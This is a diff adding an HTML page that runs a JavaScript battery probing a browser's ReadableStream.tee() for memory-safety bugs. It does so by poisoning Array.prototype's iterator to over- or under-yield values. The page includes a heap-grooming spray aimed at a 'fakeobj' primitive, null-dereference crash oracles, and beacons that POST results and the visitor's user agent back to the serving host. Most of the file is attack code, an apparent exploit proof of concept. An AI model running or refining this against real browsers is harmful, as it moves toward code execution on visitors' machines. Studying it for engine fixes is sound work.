@@ -1,0 +1,58 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>fake-stream-injector (FA-0..FA-1b)</title></head><body><pre id="out">fake-stream-injector — FA battery (my-max design, MIMO-safe iterators)
+</pre><script>
+(function(){
+ "use strict";
+ var run = "fa" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\\n"+s)); }
+ function beacon(st, body){ try{
+   fetch("/beacon/FA-"+st+"/"+run,{method:"POST",cache:"no-store",headers:{"Content-Type":"application/json"},body:JSON.stringify({body:body})}).catch(function(){});
+ }catch(e){} }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYield(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next: function(){ if (i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function poisonOverYieldIO(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next: function(){ if (i>=n) return {done:true}; var v={fake:i}; i++; return {value:v, done:false}; } }; }; }
+ function poisonUnderYield(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next: function(){ if (i>=n) return {done:true}; var v={fake:i}; i++; return {value:v, done:false}; } }; }; }
+ function poisonUnderYieldPrimitive(){ return function(){ var arr=this,i=0,n=1;
+   return { next: function(){ if (i>=n) return {done:true}; i++; return {value: 0x1337, done:false}; } }; }; }
+ say("FA-0..FA-1b battery (per MY-MAX design) — fail-closed per variant");
+ beacon("L", "page loaded; ua="+navigator.userAgent.slice(0,64));
+ function v(id, label, poisonFn, work){
+   try{
+     beacon(id+"A", label); say("FA-"+id+" " + label);
+     try { Array.prototype[Symbol.iterator] = poisonFn(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var outx = work();
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     try { beacon(id+"B", "BUGLIVE=true; "+String(outx).slice(0,200)); } catch(e1){}
+   } catch(e){
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     try { beacon(id+"B", "BUGLIVE=false; threw="+String(e).slice(0,180)); } catch(e1){}
+   }
+ }
+ // FA-0 control
+ v("0", "CONTROL clean tee", poisonOverYield, function(){ var rs = new ReadableStream({}); var pair = rs.tee(); if (pair.length!==2) throw "pair!=2"; return "pair.length==2 locked="+pair[0].locked; });
+ // FA-1 over-yield with REAL RECORDS first + {} extra (the 5x-confirmed MIMO pattern)
+ v("1", "over-yield real-record first (all objects)", poisonOverYield, function(){ var rs=new ReadableStream({}); var pair=rs.tee(); if (!(pair[0] instanceof ReadableStream)) throw "pair[0] not RS"; return "over-yield Accepted; pair[0].locked="+pair[0].locked; });
+ // FA-2 deputy write on the wrapped fake record
+ v("2", "deputy-write getReader on fake record", poisonOverYieldIO, function(){ var rs=new ReadableStream({}); var pair=rs.tee(); var r=pair[0].getReader(); return "getReader ok; typeof read="+(typeof r.read); });
+ // FA-3 writable-mismatch record
+ v("3", "writable-mismatch record types", poisonOverYieldIO, function(){ var rs=new ReadableStream({}); var pair=rs.tee(); var w=pair[1].getWriter; return "getWriter typeof="+(typeof w); });
+ // FA-4 groom-burst crash-oracle (under-yield with 64-size groom burst)
+ // FA-1b LAST — under-yield with primitive second yield (the ORIGINAL null-deref crash-oracle of press 1)
+ v("5", "FAKEOBJ-GATE: groom pre-seed +8 qword + under-yield 1-value tee", poisonUnderYield, function(){
+   var spray = new Array(128);
+   for (var g=0; g<128; g++) spray[g] = { fakeObjectSeed: g, aligned: (g&7) };
+   var rs = new ReadableStream({ });
+   var pair = rs.tee();                                // under-yield → *results[1] reads buffer+8 = groomed seed?
+   Array.prototype[Symbol.iterator] = origIter;
+   if (pair.length !== 2) throw "pair!=2 (fakeobj fire)";
+   return "survived fakeobj — engine didn't confuse (no fakeobj) — or groom didn't land";
+ });
+ v("1b", "under-yield + PRIMITIVE second yield (null-deref oracle)", poisonUnderYieldPrimitive, function(){ var rs=new ReadableStream({}); var pair=rs.tee(); return "survived — did the engine canonicalize the primitive yield?"; });
+ v("4", "under-yield gelder (groom burst then foo = crash oracle)", poisonUnderYieldPrimitive, function(){ var rs=new ReadableStream({}); var pair=rs.tee(); return "survived under-yield-primitive (crash did NOT fire?)"; });
+ say("FA battery COMPLETE (if you saw this line: FA-1b did not crash the process).");
+ beacon("Z", "battery-complete (no crash-auto-kill)");
+})();
+</script></body></html>
